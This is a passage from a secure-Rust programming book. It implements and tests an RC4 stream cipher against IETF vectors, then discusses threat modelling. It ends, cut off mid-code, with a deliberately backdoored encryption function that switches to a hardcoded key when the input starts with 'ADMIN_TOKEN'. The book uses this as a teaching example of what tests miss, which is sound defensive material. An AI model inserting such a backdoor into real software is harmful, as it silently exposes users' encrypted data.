<li><code>prga_next</code>'s sole parameter is <code>&amp;mut self</code>, a <em>mutable reference</em> to the <code>Rc4</code> structure on which it will be called. We need the <code>mut</code> keyword here again because this function makes changes to an <code>Rc4</code> struct - it writes indexes <code>i</code> and <code>j</code>, and swaps bytes inside the cipher state buffer <code>s</code>.</li>
</ul>
<p>As an aside - we can visualize that line, outputing <code>k</code>, like so:<sup class="footnote-reference" id="fr-RC4Wiki-1"><a href="#footnote-RC4Wiki">10</a></sup></p>
<br>
<p align="center">
  <img width="100%" src="chp2/rc4_2.svg">
  <figure>
  <br>
  <figcaption><center>Visualization of <i><b>k = s[(s[i] + s[j]) mod 256]</i></b></center></figcaption><br>
  </figure>
</p>
<h2 id="3-endecryption"><a class="header" href="#3-endecryption">3. {En,De}cryption</a></h2>
<h3 id="the-classic-flexible-interface"><a class="header" href="#the-classic-flexible-interface">The Classic Flexible Interface</a></h3>
<p>We implement encryption by XORing each <code>prga_next</code> output byte (keystream) with each byte of the plaintext.
Since XOR is reversible, the same function also works for decryption!</p>
<pre><code class="language-rust ignore">impl Rc4 {
    // ..new() definition omitted..

    /// Stateful, in-place en/decryption (current keystream XORed with data).
    /// Use if plaintext/ciphertext is transmitted in chunks.
    pub fn apply_keystream(&amp;mut self, data: &amp;mut [u8]) {
        for b_ptr in data {
            *b_ptr ^= self.prga_next();
        }
    }

    // ..prga_next() definition omitted..
}</code></pre>
<p>Implementing encryption within a <em>method</em> maximizes flexibility: if we receive data in [potentially variable length] chunks, a single instance of <code>Rc4</code> can perform "running" encryption across multiple chunks like so (the below is an API usage example, not part of our <code>Rc4</code> implementation):</p>
<pre><code class="language-rust ignore">let key = [0x1, 0x2, 0x3, 0x4, 0x5];

let msg_1 = [0x48, 0x65, 0x6c, 0x6c, 0x6f]; // "Hello"
let msg_2 = [0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21]; // " World!"

// Encrypt in-place
let mut rc4 = Rc4::new(&amp;key);
rc4.apply_keystream(&amp;mut msg_1);
rc4.apply_keystream(&amp;mut msg_2);

// Decrypt in-place
let mut rc4 = Rc4::new(&amp;key);
rc4.apply_keystream(&amp;mut msg_1);
rc4.apply_keystream(&amp;mut msg_2);</code></pre>
<p>Most real-world stream cipher libraries use an API like this one.
But it entails subtle complexity: <code>rc4</code> is stateful and must be re-constructed prior to decryption with <code>new</code>.
Moreover, the order of parameters to <code>apply_keystream</code> matters - decryption would produce the incorrect result if we accidentally called <code>rc4.apply_keystream(&amp;mut msg_2)</code> before <code>rc4.apply_keystream(&amp;mut msg_1)</code> in the above.</p>
<h3 id="making-the-common-case-easier"><a class="header" href="#making-the-common-case-easier">Making the Common Case Easier</a></h3>
<p>Implementing encryption within an <em>associated function</em> provides a simpler interface, so long as all the data is in memory at once.
Which might be the case reasonably often.
Notice it's really just a wrapper that hides state from the caller:</p>
<pre><code class="language-rust ignore">impl Rc4 {
    // ..new() definition omitted..

    // ..apply_keystream() definition omitted..

    /// Stateless, in-place en/decryption (keystream XORed with data).
    /// Use if entire plaintext/ciphertext is in-memory at once.
    pub fn apply_keystream_static(key: &amp;[u8], data: &amp;mut [u8]) {
        let mut rc4 = Rc4::new(key);
        rc4.apply_keystream(data);
    }

    // ..prga_next() definition omitted..
}</code></pre>
<p>Now we can en/decrypt with a single method call, no need to worry about the state of an <code>Rc4</code> instance (API usage example below):</p>
<pre><code class="language-rust ignore">let key = [0x1, 0x2, 0x3, 0x4, 0x5];

let msg = [
    0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f,
    0x72, 0x6c, 0x64, 0x21,
]; // "Hello World!"

// Encrypt in-place
Rc4::apply_keystream_static(&amp;key, &amp;mut msg);

// Decrypt in-place
Rc4::apply_keystream_static(&amp;key, &amp;mut msg);</code></pre>
<p>With our two en/decryption functions done, we've now finished implementation.
Time for validation.
Cryptography software really needs to be correct, we can't stop here.
Let's put this code through its paces!</p>
<blockquote>
<p><strong>How can encryption and decryption be the same operation?</strong></p>
<p>In short, because XOR is both reversible and, due to the nature of the keystream, unpredictable:</p>
<ul>
<li>
<p>First, <code>cipher_text = plain_text ^ key_stream</code> (encryption).</p>
</li>
<li>
<p>Then, <code>plain_text = cipher_text ^ key_stream</code> (decryption).</p>
</li>
<li>
<p>The key stream can flip any bit in the plaintext as if by 50/50 random chance.</p>
</li>
</ul>
<p>For a more mathematically principled treatment, we recommend the proof on page 32 of Paar and Pelzl's <em>Understanding Cryptography</em><sup class="footnote-reference" id="fr-UnderstandingCrypto-1"><a href="#footnote-UnderstandingCrypto">11</a></sup>.
While it's a university textbook, the formalisms are lightweight and precise.
It's an excellent introduction to the field of cryptography.
And the book is supplemented by free video lectures<sup class="footnote-reference" id="fr-UnderstandingCryptoVideo-1"><a href="#footnote-UnderstandingCryptoVideo">12</a></sup>.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-BeginMacro">
<p>Unlike C macros, Rust macros are <em>hygienic</em>: they won't cause subtle problems by capturing identifiers. This is part of what makes them so easy to use. In fact, <code>println!</code> is a macro. So you already used a macro when running the "Hello world!" program at the end of Chapter 1. <a href="#fr-BeginMacro-1">↩</a></p>
</li>
<li id="footnote-TraitDebug">
<p><a href="https://doc.rust-lang.org/std/fmt/trait.Debug.html"><em>Trait <code>std::fmt::Debug</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitDebug-1">↩</a></p>
</li>
<li id="footnote-Obj">
<p>In Rust, shared behavior is defined by <em>trait composition</em>, not by <em>object-oriented inheritance</em>. There's no "class hierarchy", like in C++ or Java. We'll cover traits in Chapter 3. <a href="#fr-Obj-1">↩</a></p>
</li>
<li id="footnote-AssocMeth">
<p>Technically, per the Rust reference<sup class="footnote-reference" id="fr-RustRef-1"><a href="#footnote-RustRef">13</a></sup>, "Associated functions are functions associated with a type" and "Associated functions whose first parameter is named <code>self</code> are called methods...". But that's pretty in the weeds. We treat <em>associated functions</em> and <em>methods</em> as distinct in this section for clarity. <a href="#fr-AssocMeth-1">↩</a></p>
</li>
<li id="footnote-SliceEff">
<p>Slice references are "fat pointers" (tuple of pointer and element count), they allow us to pass variable-length data without copying it (recall "pass-by-reference", from when we first talked about pointers). <a href="#fr-SliceEff-1">↩</a></p>
</li>
<li id="footnote-SliceFlex">
<p>Slices are flexible because different kinds of collections (say, a fixed-size array or dynamically-sized vector) can be "viewed" through a slice. So you'll encounter them often in idiomatic Rust code. <a href="#fr-SliceFlex-1">↩</a></p>
</li>
<li id="footnote-IDPerm">
<p><a href="https://en.wikipedia.org/wiki/Permutation_group#Neutral_element_and_inverses"><em>Neutral element and inverses</em></a>. Wikipedia (Accessed 2022). <a href="#fr-IDPerm-1">↩</a></p>
</li>
<li id="footnote-ModArith">
<p><a href="https://en.wikipedia.org/wiki/Modular_arithmetic"><em>Modular arithmetic</em></a>. Wikipedia (Accessed 2022). <a href="#fr-ModArith-1">↩</a></p>
</li>
<li id="footnote-Cast">
<p>There are best practices related to casting in Rust. Namely using traits <code>From</code> and <code>Into</code> for <em>infallible</em> conversions between types, and <code>TryFrom</code> and <code>TryInto</code> for <em>fallible</em> conversions. We'll discus this topic in detail later. <a href="#fr-Cast-1">↩</a></p>
</li>
<li id="footnote-RC4Wiki">
<p><a href="https://en.wikipedia.org/wiki/RC4"><em>RC4</em></a>. Wikipedia (Accessed 2022). <a href="#fr-RC4Wiki-1">↩</a></p>
</li>
<li id="footnote-UnderstandingCrypto">
<p><a href="https://amzn.to/3IEYuNd"><em><strong>[PERSONAL FAVORITE]</strong> Understanding Cryptography</em></a>. Christof Paar, Jan Pelzl (2009). <a href="#fr-UnderstandingCrypto-1">↩</a></p>
</li>
<li id="footnote-UnderstandingCryptoVideo">
<p><a href="https://www.crypto-textbook.com/movies.php"><em>Online Cryptography Course</em></a>. Christof Paar, Jan Pelzl (2009). <a href="#fr-UnderstandingCryptoVideo-1">↩</a></p>
</li>
<li id="footnote-RustRef">
<p><a href="https://doc.rust-lang.org/reference/items/associated-items.html"><em>The Rust Reference: Associated Items</em></a>. The Rust Team (2021). <a href="#fr-RustRef-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="dynamic-assurance-3-of-3"><a class="header" href="#dynamic-assurance-3-of-3">Dynamic Assurance (3 of 3)</a></h1>
<p>You may have noticed a little module (scope of the <code>mod</code> keyword) hanging out at the bottom of <code>crypto_tool/rc4/src/lib.rs</code>:</p>
<pre><code class="language-rust noplaypen">#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}</code></pre>
<p>This is unit test boilerplate, it was filled in when we ran <code>cargo new crypto_tool/rc4 --lib</code> earlier.
We're going to replace it with our own unit test now.</p>
<p>The first test we'll write is essentially a "sanity check".
At a bare minimum, our library should be able to transform plaintext into something different (presumably an encrypted form) and back into the original.
That's what this test checks for:</p>
<pre><code class="language-rust ignore">#[cfg(test)]
mod tests {
    use super::Rc4;

    #[test]
    fn sanity_check_static_api() {
        #[rustfmt::skip]
        let key: [u8; 16] = [
            0x4b, 0x8e, 0x29, 0x87, 0x80, 0x95, 0x96, 0xa3,
            0xbb, 0x23, 0x82, 0x49, 0x9f, 0x1c, 0xe7, 0xc2,
        ];

        #[rustfmt::skip]
        let plaintext = [
            0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f,
            0x72, 0x6c, 0x64, 0x21,
        ]; // "Hello World!"

        let mut msg: [u8; 12] = plaintext.clone();

        println!(
            "Plaintext (initial): {}",
            String::from_utf8(msg.to_vec()).unwrap()
        );

        // Encrypt in-place
        Rc4::apply_keystream_static(&amp;key, &amp;mut msg);
        assert_ne!(msg, plaintext);

        println!("Ciphertext: {:x?}", msg);

        // Decrypt in-place
        Rc4::apply_keystream_static(&amp;key, &amp;mut msg);
        assert_eq!(msg, plaintext);

        println!(
            "Plaintext (decrypted): {}",
            String::from_utf8(msg.to_vec()).unwrap()
        );
    }
}</code></pre>
<p>We print our initial plaintext, use <code>apply_keystream_static</code> to encrypt it and print the result, then similarly decrypt it and print the result.</p>
<ul>
<li>
<p><code>key</code> is a random, 16-byte key we've chosen arbitrarily for testing purposes.</p>
</li>
<li>
<p><code>msg</code> is the raw bytes for the ASCII<sup class="footnote-reference" id="fr-ASCII-1"><a href="#footnote-ASCII">1</a></sup> string "Hello World!".</p>
</li>
<li>
<p><code>String::from_utf8(msg.to_vec()).unwrap()</code> converts the raw bytes into a printable string.</p>
<ul>
<li>This is a fallible operation (we could have provided non-printable bytes as input!) so an "operation result" has to be "unwrapped" (<code>.unwrap()</code> is like an <code>assert!</code> here). We'll discuss <code>Result</code> and error handling in Chapter 3.</li>
</ul>
</li>
<li>
<p><code>#[rustfmt::skip]</code> tells our code formatter (invoked via <code>cargo fmt</code>) not to change the indentation of the variable it appears above. It's not pertinent to this test, but you may have been curious what it's for. Rust supports configurable code formatting and linting to make style consistent for large, multi-developer codebases.</p>
</li>
</ul>
<p>You can run this test with <code>cargo test</code> command, from the <code>crypto_tool/rc4</code> directory.
By default, <code>cargo test</code> prints only test results, not their console output, unless a test fails.</p>
<p>To see our <code>println!</code> statements, we need to use <code>cargo test -- --show-output</code>.
Then output will include the following:</p>
<pre><code class="language-ignore">---- tests::sanity_check_static_api stdout ----
Plaintext (initial): Hello World!
Ciphertext: [d0, 1c, 95, d4, 40, c7, 3c, 53, 8a, 22, d9, a1]
Plaintext (decrypted): Hello World!
</code></pre>
<p>Our simple dynamic test demonstrates we have a runnable program capable of scrambling and unscrambling a message!</p>
<p>Note how we don't print the ciphertext as a string, since it contains non-printable characters.
We display the raw hexadecimal bytes instead.
You can take a second to write a similar test for the chunk API, <code>apply_keystream</code>, now.</p>
<p>1st-party unit test support, via <code>cargo test</code>, is a major strength of Rust relative to C and C++.
We didn't need to learn/configure/build/import any 3rd party test frameworks to get a modern development experience.</p>
<p>While our methodology is powerful, our actual test was not.
This "sanity check" doesn't actually prove that we implemented RC4 correctly - just that our code can transform the data and reverse the change.
There's a risk that the generated cipher text is incorrect for the given key, potentially in some way that makes it "crackable" - maybe an attacker can leverage some flaw and extract plaintext without knowledge of the key.</p>
<p>To ensure that's not the case, we need to validate our implementation dynamically.
Create a runnable test against ground truth.
For cryptographic ciphers, this often means comparing against official "test vectors" (known-good input-output pairs).</p>
<h2 id="dynamic-validation"><a class="header" href="#dynamic-validation">Dynamic Validation</a></h2>
<p>RC4 was, in the not-so-distant-past, a critical part of internet security.
Almost every TLS connection on the internet once used, or could choose to use, the algorithm.
Thus, a leading internet standards body - the Internet Engineering Task Force (IETF) - released official test vectors<sup class="footnote-reference" id="fr-TestVec-1"><a href="#footnote-TestVec">2</a></sup> to help protocol implementers validate their RC4 libraries.</p>
<p>We're going to leverage those official vectors now!
<em>Justifiable confidence</em> is the hallmark of <em>high assurance</em> programming.</p>
<p>The IETF document<sup class="footnote-reference" id="fr-TestVec-2"><a href="#footnote-TestVec">2</a></sup> contains over a dozen tables of test vector data.
Here's the first one:</p>
<pre><code class="language-ignore">Key length: 40 bits.
key: 0x0102030405

DEC    0 HEX    0:  b2 39 63 05  f0 3d c0 27   cc c3 52 4a  0a 11 18 a8
DEC   16 HEX   10:  69 82 94 4f  18 fc 82 d5   89 c4 03 a4  7a 0d 09 19
DEC  240 HEX   f0:  28 cb 11 32  c9 6c e2 86   42 1d ca ad  b8 b6 9e ae
DEC  256 HEX  100:  1c fc f6 2b  03 ed db 64   1d 77 df cf  7f 8d 8c 93
DEC  496 HEX  1f0:  42 b7 d0 cd  d9 18 a8 a3   3d d5 17 81  c8 1f 40 41
DEC  512 HEX  200:  64 59 84 44  32 a7 da 92   3c fb 3e b4  98 06 61 f6
DEC  752 HEX  2f0:  ec 10 32 7b  de 2b ee fd   18 f9 27 76  80 45 7e 22
DEC  768 HEX  300:  eb 62 63 8d  4f 0b a1 fe   9f ca 20 e0  5b f8 ff 2b
DEC 1008 HEX  3f0:  45 12 90 48  e6 a0 ed 0b   56 b4 90 33  8f 07 8d a5
DEC 1024 HEX  400:  30 ab bc c7  c2 0b 01 60   9f 23 ee 2d  5f 6b b7 df
DEC 1520 HEX  5f0:  32 94 f7 44  d8 f9 79 05   07 e7 0f 62  e5 bb ce ea
DEC 1536 HEX  600:  d8 72 9d b4  18 82 25 9b   ee 4f 82 53  25 f5 a1 30
DEC 2032 HEX  7f0:  1e b1 4a 0c  13 b3 bf 47   fa 2a 0b a9  3a d4 5b 8b
DEC 2048 HEX  800:  cc 58 2f 8b  a9 f2 65 e2   b1 be 91 12  e9 75 d2 d7
DEC 3056 HEX  bf0:  f2 e3 0f 9b  d1 02 ec bf   75 aa ad e9  bc 35 c4 3c
DEC 3072 HEX  c00:  ec 0e 11 c4  79 dc 32 9d   c8 da 79 68  fe 96 56 81
DEC 4080 HEX  ff0:  06 83 26 a2  11 84 16 d2   1f 9d 04 b2  cd 1c a0 50
DEC 4096 HEX 1000:  ff 25 b5 89  95 99 67 07   e5 1f bd f0  8b 34 d8 75
</code></pre>
<p>We're given a key (line 2) and 18 samples from the keystream a valid RC4 implementation should produce (the subsequent rows).
Each sample is 16 bytes long and preceded by its offset into the keystream (given in both decimal and hex).</p>
<p>Translating every sample from every table into a test suite would be important for a real library, but tedious for our example.
So we'll use just the first 4 rows of the table above:</p>
<pre><code class="language-rust ignore">#[cfg(test)]
mod tests {
    use super::Rc4;

    // ..sanity_check_static_api() omitted..

    // See: https://datatracker.ietf.org/doc/html/rfc6229#section-2
    #[test]
    fn ietf_40_bit_key_first_4_vectors() {
        let key: [u8; 5] = [0x01, 0x02, 0x03, 0x04, 0x5];
        let mut out_buf: [u8; 272] = [0x0; 272];

        #[rustfmt::skip]
        let test_stream_0: [u8; 16] = [
            0xb2, 0x39, 0x63, 0x05, 0xf0, 0x3d, 0xc0, 0x27,
            0xcc, 0xc3, 0x52, 0x4a, 0x0a, 0x11, 0x18, 0xa8,
        ];

        #[rustfmt::skip]
        let test_stream_16: [u8; 16] = [
            0x69, 0x82, 0x94, 0x4f, 0x18, 0xfc, 0x82, 0xd5,
            0x89, 0xc4, 0x03, 0xa4, 0x7a, 0x0d, 0x09, 0x19,
        ];

        #[rustfmt::skip]
        let test_stream_240: [u8; 16] = [
            0x28, 0xcb, 0x11, 0x32, 0xc9, 0x6c, 0xe2, 0x86,
            0x42, 0x1d, 0xca, 0xad, 0xb8, 0xb6, 0x9e, 0xae,
        ];

        #[rustfmt::skip]
        let test_stream_256: [u8; 16] = [
            0x1c, 0xfc, 0xf6, 0x2b, 0x03, 0xed, 0xdb, 0x64,
            0x1d, 0x77, 0xdf, 0xcf, 0x7f, 0x8d, 0x8c, 0x93,
        ];

        // Remaining 14 vectors in set skipped for brevity...

        // Create an instance of the cipher
        let mut rc4 = Rc4::new(&amp;key);

        // Output keystream
        rc4.apply_keystream(&amp;mut out_buf);

        // Validate against official vectors
        assert_eq!(out_buf[0..16], test_stream_0);
        assert_eq!(out_buf[16..32], test_stream_16);
        assert_eq!(out_buf[240..256], test_stream_240);
        assert_eq!(out_buf[256..272], test_stream_256);
    }
}</code></pre>
<ul>
<li>
<p><code>out_buf</code> is an array for storing the first 272 bytes of the keystream (just enough to slice out the first four samples for comparison). It starts initialized to all zeros. Instead of initializing it in a loop, we use the shorthand <code>[0x0; 272]</code>.</p>
<ul>
<li>Any byte XORed with <code>0x00</code> is itself. So encrypting a zero-buffer means we're just extracting our implementation's keystream. In any secure cipher, this keystream should be indistinguishable from a random sequence of bytes. For RC4, the values should match the official vectors.</li>
</ul>
</li>
<li>
<p>Each <code>assert_eq!</code> checks a slice of the keystream (a subset of <code>out_buf</code>) against the corresponding test vector (<code>test_stream_*</code>).</p>
<ul>
<li>Notice we use slicing notation to grab 16-byte chunks at an offset corresponding to the document's table (e.g. <code>out_buf[240..256]</code> means bytes in the range <code>[240, 256)</code> of our <code>272</code>).</li>
</ul>
</li>
</ul>
<p>If you run <code>cargo test</code> from the <code>crypto_tool/rc4</code> directory, you should now see both unit tests pass:</p>
<pre><code class="language-ignore">running 2 tests
test tests::ietf_40_bit_key_first_4_vectors ... ok
test tests::sanity_check_static_api ... ok
</code></pre>
<h2 id="takeaway-2"><a class="header" href="#takeaway-2">Takeaway</a></h2>
<p>You've now built your first piece of high assurance software (sans the RC4 algorithm itself).
Your RC4 library is:</p>
<ul>
<li>Fully memory-safe, hence <code>#![forbid(unsafe_code)]</code></li>
<li>Stand-alone and capable for running almost anywhere, hence <code>#![no_std]</code></li>
<li>Functionally validated, using official IETF test vectors</li>
</ul>
<p>Before we get to the fun and tangible part - writing a command line tool that uses this library to encrypt local files - we need to take a step back and understand the limitations of all the static and dynamic assurance topics discussed so far.</p>
<blockquote>
<p><strong>Is Rust a good choice for cryptographic libraries?</strong></p>
<p>A study of C and C++ cryptographic libraries found that only 27.2% of reported vulnerabilities were caused by flaws related to the cryptography itself, but 37.2% were memory safety issues<sup class="footnote-reference" id="fr-CryptoStudy-1"><a href="#footnote-CryptoStudy">3</a></sup>.</p>
<p>Because both performance and security are core requirements, cryptography is a prime use case for Rust (pun intended).
The language has a thriving cryptographic ecosystem.
<code>rustls</code><sup class="footnote-reference" id="fr-RusTLS-1"><a href="#footnote-RusTLS">4</a></sup>, a pure-Rust TLS library, is one notable project.
In 2019, it outperformed OpenSSL by significant margins<sup class="footnote-reference" id="fr-FastRust-1"><a href="#footnote-FastRust">5</a></sup>.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-ASCII">
<p><a href="https://en.wikipedia.org/wiki/ASCII"><em>ASCII</em></a>. Wikipedia (Accessed 2022). <a href="#fr-ASCII-1">↩</a></p>
</li>
<li id="footnote-TestVec">
<p><a href="https://datatracker.ietf.org/doc/html/rfc6229"><em>Test Vectors for the Stream Cipher RC4</em></a>. Internet Engineering Task Force (2011). <a href="#fr-TestVec-1">↩</a> <a href="#fr-TestVec-2">↩2</a></p>
</li>
<li id="footnote-CryptoStudy">
<p><a href="https://arxiv.org/pdf/2107.04940.pdf"><em>You Really Shouldn’t Roll Your Own Crypto: An Empirical Study of Vulnerabilities in Cryptographic Libraries</em></a>. Jenny Blessing, Michael A. Specter, Daniel J. Weitzner (2021). Please note that, at the time of this writing, this paper has not yet been accepted to a peer-reviewed conference. <a href="#fr-CryptoStudy-1">↩</a></p>
</li>
<li id="footnote-RusTLS">
<p><a href="https://github.com/rustls/rustls"><em><code>rustls</code></em></a>. rustls Contributors (Accessed 2022). <a href="#fr-RusTLS-1">↩</a></p>
</li>
<li id="footnote-FastRust">
<p><a href="https://www.zdnet.com/article/a-rust-based-tls-library-outperformed-openssl-in-almost-every-category/"><em>A Rust-based TLS library outperformed OpenSSL in almost every category</em></a>. Catalin Cimpanu (2019). <a href="#fr-FastRust-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="limitations-and-threat-modeling"><a class="header" href="#limitations-and-threat-modeling">Limitations and Threat Modeling</a></h1>
<p>The trouble with computer security is that there's always bad news.
As security practitioners, we have to be keenly aware of limitations.
That is:</p>
<ul>
<li>
<p>What are we <em>not</em> confident in?</p>
<ul>
<li>If we can't propose potential weaknesses, then we're very likely over-estimating our strengths. That's a risky place to be.</li>
</ul>
</li>
<li>
<p>Against which <em>threats</em> does a type system provide little assurance?</p>
<ul>
<li>
<p>The composition of all <strong>threat vectors</strong>  decides our <strong>attack surface</strong>. As it grows, we present more potential entry points for an attacker. The riskiest surfaces are often at <strong>trust boundaries</strong>.</p>
<ul>
<li>
<p><em>Threat vectors:</em> Potential routes of access for an attacker.</p>
</li>
<li>
<p><em>Attack surface:</em> The set of threat vectors present in a given system.</p>
</li>
<li>
<p><em>Trust boundaries:</em> Interfaces between less-trusted and more-trusted components of a system.</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Which <em>functional requirements</em> can't be validated by our dynamic test suite?</p>
<ul>
<li>
<p>Here lurk potential <strong>design flaws</strong>. If these oversights are discovered after a system is deployed, fixing them can be costly.</p>
<ul>
<li><em>Design flaw:</em> A flaw in fundamental functionality (as opposed to a bug in the code) that causes a system to fail to meet requirements. At the level of a principle or a pattern.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>This section provides broader context for the static and dynamic assurance claims we've made thus far.
A reality check, if you will.
To cover a wide spectrum of related topics quickly, we'll jump around a little bit.</p>
<h2 id="manual-static-analysis-forever"><a class="header" href="#manual-static-analysis-forever">Manual Static Analysis Forever!</a></h2>
<p>Consider three potential causes of a security vulnerability.
Each is incredibly difficult to design an effective automated analysis for, static or dynamic, because each bug is almost impossible to define in a universally-applicable way.</p>
<ol>
<li>
<p><strong>Improper Input Validation:</strong> Fail to validate that user-provided data is both syntactically and semantically correct.</p>
<ul>
<li><em>Example:</em> A web portal uses only client-side (e.g. bypass-able!) JavaScript to validate form entries, and one of the inputs is passed to a server-side shell when a command gets executed.</li>
</ul>
</li>
<li>
<p><strong>Information Leakage:</strong> Expose sensitive<sup class="footnote-reference" id="fr-IFC-1"><a href="#footnote-IFC">1</a></sup> or superfluous information.</p>
<ul>
<li><em>Example:</em> An authentication service logs verbosely for internal troubleshooting purposes, but the logs include users' plaintext passwords - sensitive data otherwise stored only in hashed form.</li>
</ul>
</li>
<li>
<p><strong>Misconfiguration:</strong> Introduce vulnerabilities by choosing incorrect or suboptimal parameters during the configuration of a system.</p>
<ul>
<li><em>Example:</em> A network router allows password authenticated SSH login and the same default password is used for every device shipped.</li>
</ul>
</li>
</ol>
<p>In reality, even the fanciest of type systems coupled with the most comprehensive of test suites can't guarantee security.</p>
<ul>
<li>
<p><strong>Static Limit:</strong> Most vulnerability classes can't be eliminated by properties encoded within the semantics of a practical type system<sup class="footnote-reference" id="fr-TypeState-1"><a href="#footnote-TypeState">2</a></sup>.</p>
</li>
<li>
<p><strong>Dynamic Limit:</strong> Many complex states aren't covered by tests<sup class="footnote-reference" id="fr-DirtyPipe-1"><a href="#footnote-DirtyPipe">3</a></sup> and are difficult to replicate in production.</p>
</li>
</ul>
<p>Moreover, on the static side of things, rules for converting between types can be misunderstood by programmers.
Especially in languages with complex class hierarchies.
Sometimes casting errors introduce <em>type confusion</em> vulnerabilities, where memory encoding one data type is misinterpreted as another - breaking type safety guarantees.</p>
<blockquote>
<p><strong>How does type confusion happen in C++?</strong></p>
<p>Although C++ is statically typed, it remains a type-unsafe language.
On the extreme end, its weak typing means programmers can cast between arbitrary types that have no logical relationship.</p>
<p>More commonly, programmers cast between types within a given hierarchy of objects.
This makes logical sense in the context, but introduces potential for subtle errors.
Despite a static check passing, we can experience serious type issues at runtime:</p>
<ul>
<li><strong>1st-order type confusion:</strong> Say someone mistakenly casts an instance of a parent class to one of its descendants, and the parent lacks some of the descendant's fields. When one of the missing fields is accessed, we might treat arbitrary data as a pointer!</li>
</ul>
<p>Moreover, memory corruption bugs undermine type safety in general:</p>
<ul>
<li><strong>2nd-order type confusion:</strong> Maybe a program doesn't contain any casting errors, but a memory corruption bug elsewhere allows an attacker to write an object's memory. Specifically, to overwrite a pointer within an object's internal method dispatch table. We could arrive at the same arbitrary pointer problem.</li>
</ul>
<p>Scenarios like these are how browsers, virtual machines, and databases written in C++ are commonly exploited<sup class="footnote-reference" id="fr-HexType-1"><a href="#footnote-HexType">4</a></sup>.
By contrast, Rust is type-safe (the language forces all type conversion to follow strict, statically-enforced rules<sup class="footnote-reference" id="fr-RustTypes-1"><a href="#footnote-RustTypes">5</a></sup>) and memory-safe (no corruption).</p>
</blockquote>
<p>We still need manual static analysis done by skilled humans, in the form of audits.
That means knowledgeable people reading code and design documents to find vulnerabilities before an attacker does.</p>
<p>We won't exhaustively enumerate high priority bug classes in this book.
There are already high-quality, freely-available resources for this purpose.
Two of the most impactful are the <em>MITRE CWE Top 25 Most Dangerous Software Weaknesses</em><sup class="footnote-reference" id="fr-CWETop25-1"><a href="#footnote-CWETop25">6</a></sup> and then <em>OWASP Top 10 Web Application Security Risks</em><sup class="footnote-reference" id="fr-OWASP-1"><a href="#footnote-OWASP">7</a></sup>.
The former describes itself as follows<sup class="footnote-reference" id="fr-CWETop25-2"><a href="#footnote-CWETop25">6</a></sup>:</p>
<blockquote>
<p>The 2021 Common Weakness Enumeration (CWE) Top 25 Most Dangerous Software Weaknesses (CWE Top 25) is a demonstrative list of the most common and impactful issues experienced over the previous two calendar years. These weaknesses are dangerous because they are often easy to find, exploit, and can allow adversaries to completely take over a system, steal data, or prevent an application from working.</p>
</blockquote>
<p>According to the CWE Top 25<sup class="footnote-reference" id="fr-CWETop25-3"><a href="#footnote-CWETop25">6</a></sup>, "Out-of-bounds Write", a memory safety issue, was the #1 weakness in 2021.
In fact, the list includes a handful of issues safe Rust eliminates entirely (e.g. Out-of-bounds Read, Use After Free, <code>NULL</code> Pointer Dereference).</p>
<p>But let's not give Rust too much credit.
The majority of enumerated weaknesses are completely outside of the domain Rust's compiler can reason about.
Even though Rust software has a head start in knocking out the top 25, software assurance <em>must</em> include <em>manual</em> processes.
Remember: tools are a supplement for scale, not a substitute for smarts.</p>
<h2 id="example-dynamic-testing-failing-to-detect-an-rc4-backdoor"><a class="header" href="#example-dynamic-testing-failing-to-detect-an-rc4-backdoor">Example: Dynamic Testing Failing to Detect an RC4 Backdoor</a></h2>
<p>March 2020 marked the start of the global Covid-19 pandemic<sup class="footnote-reference" id="fr-Covid19-1"><a href="#footnote-Covid19">8</a></sup>.
Far less significant, but more relevant to this book: that same March saw one of the biggest security breaches in history - over 30,000 public and private organizations fell victim to malware spread via a backdoored product<sup class="footnote-reference" id="fr-SolarWinds-1"><a href="#footnote-SolarWinds">9</a></sup>.
SolarWinds, the company behind the product, was unaware that malicious code had been inserted into a system at the time they shipped updates to their customers.</p>
<p>Let's make our limitations discussion more concrete with an example.
We'll demonstrate that Rust's static checks and our dynamic test vectors can't guarantee that our RC4 implementation is completely secure.</p>
<p>Imagine an attacker has a foothold on the network and can sniff traffic (e.g. "man-in-the-middle").
They've compromised our organization's build system, SolarWinds style, and backdoored the implementation of our RC4 library like so:</p>
<pre><code class="language-rust ignore">impl Rc4 {
    // ..new() definition omitted..

    // ..apply_keystream() definition omitted..

    /// Stateless, in-place en/decryption (keystream XORed with data).
    /// Use if entire plaintext/ciphertext is in-memory at once.
    pub fn apply_keystream_static(key: &amp;[u8], data: &amp;mut [u8]) {
        // Backdoor RC4 &gt;:)
        let mut rc4 = if data.starts_with("ADMIN_TOKEN".as_bytes()) {
            Rc4::new(&amp;[0xB, 0xA, 0xD, 0xC, 0x0, 0xD, 0xE])
        } else {
            Rc4::new(key)
        };

